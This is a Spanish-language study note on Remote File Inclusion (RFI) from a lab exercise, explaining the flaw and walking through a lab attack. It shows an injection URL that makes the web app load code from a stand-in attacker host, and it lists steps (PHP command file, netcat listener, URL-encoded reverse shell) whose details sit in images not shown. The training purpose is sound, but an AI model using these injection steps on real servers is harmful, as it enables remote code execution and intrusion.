---
layout: apunte
title: "5. Remote File Inclusion - RFI"
---

La Inclusión Remota de Archivos (Files), RFI, es una técnica para incluir archivos remotos en una aplicación vulnerable. Como LFI, RFI ocurre al no sanitizar correctamente el input del usuario, permitiendo al atacante incluir un URL externo en la función `include`. Un requerimiento para RFI es que `allow_url_fopen` necesita estar en `on`.

La RFI es más peligrosa que LFI, ya que permiten al atacante ganar RCE (Ejecución Remota de Comandos) en el servidor. Otras consecuencias de un ataque RFI exitoso incluyen:

- Divulgación de Información Sensible.
- Cross-Site Scripting (XSS).
- Denial of Service (DoS).

Un servidor externo debe comunicarse con la aplicación para un RFI exitoso donde el atacante guarde archivos maliciosos que serán inyectados por medio de la URL en la aplicación web.

---------------------------------
<h2>Pasos RFI</h2>
!**Pasted image 20251106114126.png**

La imagen de arriba muestra un ejemplo de los pasos para un ataque RFI exitoso. Digamos que el atacante hostea un archivo PHP en su propio servidor `http://attacker.thm/cmd.txt` donde `cmd.txt` contiene un mensaje `Helo THM`.

```php
<?PHP echo "Hello THM"; ?>
```

Primero, el atacante inyecta la URL maliciosa, la cual apunta al servidor del atacante, como: `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`. Si no hay validación de input, entonces la URL maliciosa se pasa a la función `include`. Entonces, la aplicación web mandará un `GET` al servidor malicioso para cargar el archivo. En nuestro caso, la aplicación web mostrará `Hello THM`.

1. Primero vamos a crear un archivo PHP que nos deje ejecutar comandos.
   !**Pasted image 20251106122527.png**
2. Nos ponemos en escucha con `python`:
   !**Pasted image 20251106120922.png**
3. Abrimos un listener con `nc`.
   !**Pasted image 20251106123728.png**
4. Copiamos la reverse shell URLencodeada:
   !**Pasted image 20251106123838.png**
5. Encodeamos las partes necesarias de la URL (todo menos las direcciones IP):
   !**Pasted image 20251106124615.png**
6. Lo metemos en la URL del laboratorio (no en la caja de buscar) y obtenemos una shell.
   !**Pasted image 20251106124734.png**
7. Ejecutamos el comando requerido:
   !**Pasted image 20251106124821.png**